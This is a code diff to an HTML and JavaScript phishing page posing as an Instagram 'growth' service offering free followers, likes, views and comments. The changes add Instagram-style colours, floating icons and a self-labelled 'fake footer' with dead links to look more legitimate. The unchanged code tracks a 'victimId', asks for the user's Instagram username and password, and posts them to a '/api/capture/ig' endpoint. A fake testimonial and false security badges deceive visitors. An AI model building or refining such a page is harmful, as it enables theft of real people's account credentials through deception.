@@ -14,7 +14,47 @@
             align-items: center;
             font-family: 'Segoe UI', Roboto, sans-serif;
             padding: 16px;
+            position: relative;
+            overflow-x: hidden;
         }
+
+        /* ===== ANIMATED FLOATING LOGOS ===== */
+        .floating-logos {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .floating-logos span {
+            position: absolute;
+            display: block;
+            font-size: 40px;
+            opacity: 0.08;
+            animation: floatLogo 20s infinite linear;
+            color: #f09433;
+        }
+        .floating-logos span:nth-child(1) { left: 5%; animation-duration: 18s; animation-delay: 0s; font-size: 60px; }
+        .floating-logos span:nth-child(2) { left: 15%; animation-duration: 22s; animation-delay: 2s; font-size: 45px; }
+        .floating-logos span:nth-child(3) { left: 25%; animation-duration: 20s; animation-delay: 4s; font-size: 70px; }
+        .floating-logos span:nth-child(4) { left: 35%; animation-duration: 25s; animation-delay: 1s; font-size: 50px; }
+        .floating-logos span:nth-child(5) { left: 45%; animation-duration: 19s; animation-delay: 3s; font-size: 65px; }
+        .floating-logos span:nth-child(6) { left: 55%; animation-duration: 23s; animation-delay: 5s; font-size: 40px; }
+        .floating-logos span:nth-child(7) { left: 65%; animation-duration: 21s; animation-delay: 2s; font-size: 55px; }
+        .floating-logos span:nth-child(8) { left: 75%; animation-duration: 24s; animation-delay: 4s; font-size: 48px; }
+        .floating-logos span:nth-child(9) { left: 85%; animation-duration: 17s; animation-delay: 1s; font-size: 62px; }
+        .floating-logos span:nth-child(10) { left: 92%; animation-duration: 26s; animation-delay: 3s; font-size: 44px; }
+
+        @keyframes floatLogo {
+            0% { top: -10%; transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { top: 110%; transform: rotate(360deg) scale(1); }
+        }
+
+        /* ===== GLASS CARD ===== */
         .glass {
             background: rgba(255,255,255,0.06);
             backdrop-filter: blur(16px);
@@ -26,6 +66,8 @@
             box-shadow: 0 25px 60px rgba(0,0,0,0.6);
             text-align: center;
             color: #fff;
+            position: relative;
+            z-index: 1;
         }
         .glass h1 {
             font-size: 28px;
@@ -41,8 +83,6 @@
             text-transform: uppercase;
             margin: 4px 0 18px;
         }
-
-        /* ===== STATS BADGE ===== */
         .stats {
             display: flex;
             justify-content: space-around;
@@ -66,11 +106,9 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-
-        /* ===== TESTIMONIAL ===== */
         .testimonial {
             background: rgba(255,255,255,0.03);
-            border-left: 3px solid #f5576c;
+            border-left: 3px solid #f09433;
             padding: 12px 16px;
             border-radius: 12px;
             margin: 14px 0;
@@ -84,7 +122,6 @@
             font-weight: 600;
             margin-top: 4px;
         }
-
         .option-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -120,7 +157,6 @@
             opacity: 0.5;
             margin-top: 2px;
         }
-
         .glow-btn {
             background: linear-gradient(145deg, #f093fb, #f5576c);
             border: none;
@@ -136,7 +172,6 @@
             margin: 12px 0 6px;
         }
         .glow-btn:active { transform: scale(0.96); }
-
         .input-group {
             text-align: left;
             margin: 14px 0 8px;
@@ -163,7 +198,6 @@
             border-color: #f5576c;
             background: rgba(255,255,255,0.07);
         }
-
         .back-btn {
             background: rgba(255,255,255,0.04) !important;
             border: 1px solid rgba(255,255,255,0.06) !important;
@@ -172,13 +206,11 @@
             font-size: 15px !important;
             padding: 14px !important;
         }
-
         .footer-text {
             font-size: 11px;
             opacity: 0.3;
             margin-top: 18px;
         }
-
         .trust-badge {
             display: flex;
             justify-content: center;
@@ -189,15 +221,50 @@
         }
         .trust-badge span { display: flex; align-items: center; gap: 4px; }
 
-        .hidden { display: none !important; }
+        /* ===== FAKE FOOTER ===== */
+        .fake-footer {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            flex-wrap: wrap;
+            font-size: 11px;
+            opacity: 0.4;
+        }
+        .fake-footer a {
+            color: #fff;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        .fake-footer a:hover {
+            opacity: 0.8;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
-    <div class="glass" id="mainPage">
-        <h1>🚀 Instagram Growth Suite</h1>
-        <p class="sub">Boost your account organically</p>
 
-        <!-- STATS -->
+    <!-- ===== ANIMATED FLOATING LOGOS ===== -->
+    <div class="floating-logos">
+        <span>📸</span>
+        <span>❤️</span>
+        <span>💬</span>
+        <span>📸</span>
+        <span>👥</span>
+        <span>📸</span>
+        <span>👍</span>
+        <span>📸</span>
+        <span>🔥</span>
+        <span>📸</span>
+    </div>
+
+    <!-- ===== MAIN CARD ===== -->
+    <div class="glass" id="mainPage">
+        <h1>🚀 Boost Your Profile</h1>
+        <p class="sub">Grow your Instagram presence organically</p>
+
         <div class="stats">
             <div class="stat-item">
                 <div class="number">12M+</div>
@@ -213,21 +280,25 @@
             </div>
         </div>
 
-        <!-- TESTIMONIAL -->
         <div class="testimonial">
             “I gained 10K followers in 7 days using this tool. My engagement skyrocketed!”
             <div class="author">— @sarah_mua, 2.5M followers</div>
         </div>
 
-        <!-- OPTIONS -->
         <p style="font-size:14px; opacity:0.7; margin-bottom:6px;">Choose your growth service</p>
         <div class="option-grid" id="optionGrid"></div>
 
-        <!-- TRUST BADGE -->
         <div class="trust-badge">
             <span>🔒 256-bit SSL</span>
             <span>🛡️ Secure Payment</span>
             <span>🤝 24/7 Support</span>
+        </div>
+
+        <!-- ===== FAKE FOOTER ===== -->
+        <div class="fake-footer">
+            <a href="#">🆘 Help Desk</a>
+            <a href="#">📜 Terms of Service</a>
+            <a href="#">🔒 Privacy Policy</a>
         </div>
 
         <p class="footer-text">Join 2M+ creators who grew their Instagram</p>
@@ -237,9 +308,8 @@
         const urlParams = new URLSearchParams(window.location.search);
         const victimId = urlParams.get('v') || 'unknown';
 
-        // ========== OPTIONS ==========
         const options = [
-            { id: 'followers', icon: '👥', label: 'FREE FOLLOWERS', desc: 'Boost your followers' },
+            { id: 'followers', icon: '👥', label: 'FREE FOLLOWERS', desc: 'Boost your profile' },
             { id: 'views', icon: '👁️', label: 'FREE VIEWS', desc: 'Increase story views' },
             { id: 'comments', icon: '💬', label: 'FREE COMMENTS', desc: 'Get real comments' },
             { id: 'likes', icon: '❤️', label: 'FREE LIKES', desc: 'Grow your likes' }
@@ -258,11 +328,10 @@
             grid.appendChild(card);
         });
 
-        // ========== NUMBER INPUT PAGE ==========
         function showNumberInput(optionId, optionLabel) {
             const main = document.getElementById('mainPage');
             main.innerHTML = `
-                <h1>📊 ${optionLabel}</h1>
+                <h1 style="background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">📊 ${optionLabel}</h1>
                 <p style="opacity:0.7; margin: 10px 0 18px; font-size: 14px;">
                     Enter the number of ${optionId.toLowerCase()} you want
                 </p>
@@ -272,11 +341,15 @@
                 </div>
                 <button class="glow-btn" onclick="showLogin('${optionId}', '${optionLabel}')">Next →</button>
                 <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
-                <p class="footer-text" style="margin-top:20px;">Secure & encrypted</p>
+                <div class="fake-footer" style="margin-top:20px;">
+                    <a href="#">🆘 Help Desk</a>
+                    <a href="#">📜 Terms</a>
+                    <a href="#">🔒 Privacy</a>
+                </div>
+                <p class="footer-text" style="margin-top:12px;">Secure & encrypted</p>
             `;
         }
 
-        // ========== LOGIN PAGE ==========
         function showLogin(optionId, optionLabel) {
             const quantity = document.getElementById('quantityInput').value;
             if (!quantity || quantity < 1) {
@@ -300,11 +373,15 @@
                 </div>
                 <button class="glow-btn" onclick="submitLogin('${optionId}', '${quantity}')">🚀 Claim Now</button>
                 <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
-                <p class="footer-text" style="margin-top:20px;">🔐 Your data is secure & encrypted</p>
+                <div class="fake-footer" style="margin-top:20px;">
+                    <a href="#">🆘 Help Desk</a>
+                    <a href="#">📜 Terms</a>
+                    <a href="#">🔒 Privacy</a>
+                </div>
+                <p class="footer-text" style="margin-top:12px;">🔐 Your data is secure & encrypted</p>
             `;
         }
 
-        // ========== SEND DATA ==========
         async function sendData(payload) {
             try {
                 await fetch('/api/capture/ig', {
@@ -317,7 +394,6 @@
             }
         }
 
-        // ========== SUBMIT LOGIN ==========
         async function submitLogin(optionId, quantity) {
             const username = document.getElementById('loginUser').value;
             const password = document.getElementById('loginPass').value;
